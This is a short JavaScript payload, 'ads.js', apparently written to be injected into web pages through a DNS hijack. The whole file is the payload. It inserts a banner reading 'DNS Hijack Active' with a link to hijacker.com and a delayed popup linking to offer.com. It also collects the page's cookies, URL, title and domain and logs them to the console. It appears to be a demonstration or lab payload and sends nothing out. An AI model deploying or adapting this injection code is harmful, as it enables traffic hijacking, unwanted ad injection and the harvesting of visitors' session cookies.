// ads.js - Simple ad injection
(function() {
    // Wait for page to fully load
    window.addEventListener('load', function() {
        
        // 1. TOP BANNER
        var banner = document.createElement('div');
        banner.innerHTML = `
        <div id="dns-banner" style="position:fixed;top:0;left:0;width:100%;
               background:red;color:white;padding:10px;text-align:center;
               font-family:Arial;font-size:16px;z-index:99999;">
           🔓 DNS Hijack Active | 
           <a href="http://hijacker.com" style="color:yellow">Click for Offer</a> |
           <button onclick="document.getElementById('dns-banner').style.display='none'"
                   style="background:black;color:white;border:none;padding:2px 10px;margin-left:10px;">
               X
           </button>
        </div>`;
        document.body.prepend(banner);
        
        // 2. POPUP AD (after 3 seconds)
        setTimeout(function() {
            var popup = document.createElement('div');
            popup.innerHTML = `
            <div id="dns-popup" style="position:fixed;bottom:20px;right:20px;width:250px;
                   background:white;border:2px solid blue;border-radius:5px;
                   padding:15px;box-shadow:0 0 10px rgba(0,0,0,0.3);z-index:99998;">
                <h4 style="margin:0 0 10px 0;color:blue;">⚠️ Special Offer!</h4>
                <p style="margin:0 0 10px 0;">Limited time deal!</p>
                <a href="http://offer.com" 
                   style="display:block;background:blue;color:white;text-align:center;
                          padding:8px;border-radius:3px;text-decoration:none;">
                    Claim Now
                </a>
                <button onclick="document.getElementById('dns-popup').style.display='none'"
                        style="background:gray;color:white;border:none;padding:5px 10px;
                               border-radius:3px;cursor:pointer;margin-top:10px;">
                    Close
                </button>
            </div>`;
            document.body.appendChild(popup);
        }, 3000);
        
        // 3. LOG COOKIES TO CONSOLE
        console.log('🔍 DNS Hijack - Page Cookies:', document.cookie);
        
        // 4. LOG PAGE INFO
        var pageInfo = {
            url: window.location.href,
            title: document.title,
            domain: window.location.hostname,
            cookies: document.cookie,
            timestamp: new Date().toISOString()
        };
        console.log('📊 DNS Hijack - Page Info:', pageInfo);    
    });
    
    // Optional: Show alert immediately
    // alert('🔓 DNS Hijack Active');
    
})();
